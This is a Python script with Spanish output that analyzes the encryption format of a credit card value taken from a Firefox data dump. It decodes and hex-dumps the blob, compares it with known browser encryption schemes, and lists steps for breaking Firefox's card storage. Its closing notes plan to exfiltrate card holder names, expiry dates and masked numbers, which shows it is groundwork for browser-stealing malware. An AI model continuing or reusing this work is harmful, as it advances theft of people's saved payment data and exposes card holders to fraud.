#!/usr/bin/env python3
"""
Analiza el formato de encriptación de Firefox para tarjetas
"""
import base64

# Datos del dump
encrypted_b64 = "6pCEQnX3iiHpMq8XpjcQX9TlZLMowVzJ81pC6E6FuPMXH+ebcBe4xYOuCM0="
encrypted_bytes = base64.b64decode(encrypted_b64)

print("="*60)
print("ANÁLISIS DE FORMATO DE ENCRIPTACIÓN")
print("="*60)
print(f"\nBase64: {encrypted_b64[:60]}...")
print(f"Length: {len(encrypted_bytes)} bytes")
print(f"\nHex dump completo:")
print(' '.join(f'{b:02x}' for b in encrypted_bytes))

print(f"\nPrefijo: {encrypted_bytes[:4].hex()}")
print(f"  0xEA = {encrypted_bytes[0]:08b} (binario)")
print(f"  0x90 = {encrypted_bytes[1]:08b} (binario)")
print(f"  0x84 = {encrypted_bytes[2]:08b} (binario)")
print(f"  0x42 = {encrypted_bytes[3]:08b} (binario)")

# Buscar patrones conocidos
print("\n" + "="*60)
print("COMPARACIÓN CON FORMATOS CONOCIDOS:")
print("="*60)

print("\n[NSS PK11SDR (passwords)]")
print("  Prefijo esperado: 0x30 0x32 (ASN.1 SEQUENCE)")
print("  Tu tarjeta:       0xea 0x90 0x84 0x42")
print("   NO COINCIDE")

print("\n[Base64 simple (legacy Firefox)]")
print("  Sin prefijo especial, datos raw en Base64")
print("   NO COINCIDE (tiene prefijo específico)")

print("\n[Encrypted with AES-GCM]")
print("  Común en Chromium: versión + nonce + ciphertext + tag")
print("  Prefijo v10: 0x76 0x31 0x30 ('v10')")
print("  Prefijo v20: 0x76 0x32 0x30 ('v20')")
print("   NO COINCIDE")

print("\n[Posible formato custom de Firefox]")
print("  0xEA 0x90 0x84 0x42 podría ser:")
print("  - Magic number de formato propietario")
print("  - Versión de algoritmo de encriptación")
print("  - Metadata de AES-256-GCM custom")

# Analizar estructura
print("\n" + "="*60)
print("ANÁLISIS DE ESTRUCTURA:")
print("="*60)

if len(encrypted_bytes) >= 16:
    print(f"\nBytes 0-3:   {encrypted_bytes[0:4].hex()} (posible header/versión)")
    print(f"Bytes 4-15:  {encrypted_bytes[4:16].hex()} (posible IV/nonce)")
    print(f"Bytes 16+:   {encrypted_bytes[16:].hex()} (ciphertext + tag)")
    print(f"\n Longitud sugiere AES-256-GCM:")
    print(f"   - 4 bytes: header")
    print(f"   - 12 bytes: nonce")
    print(f"   - {len(encrypted_bytes) - 16} bytes: ciphertext + auth tag")

print("\n" + "="*60)
print("CONCLUSIÓN:")
print("="*60)
print("""
Firefox probablemente usa un formato de encriptación DIFERENTE para tarjetas:
- Passwords: NSS PK11SDR (3DES-CBC con key4.db)
- Tarjetas: Custom format (posiblemente AES-256-GCM)

NEXT STEPS:
1. Buscar en código fuente de Firefox: security/manager/ssl/
2. Buscar referencias a 'cc-number-encrypted' en mozilla-central
3. Investigar si Firefox 133+ cambió el algoritmo de encriptación
4. Verificar si hay API específica de NSS para tarjetas

ALTERNATIVA:
- Exfiltrar SOLO metadata (nombre, exp, tipo, masked number)
- No exfiltrar número completo (99% de casos no tienen tarjetas guardadas)
- Documentar como limitación conocida
""")
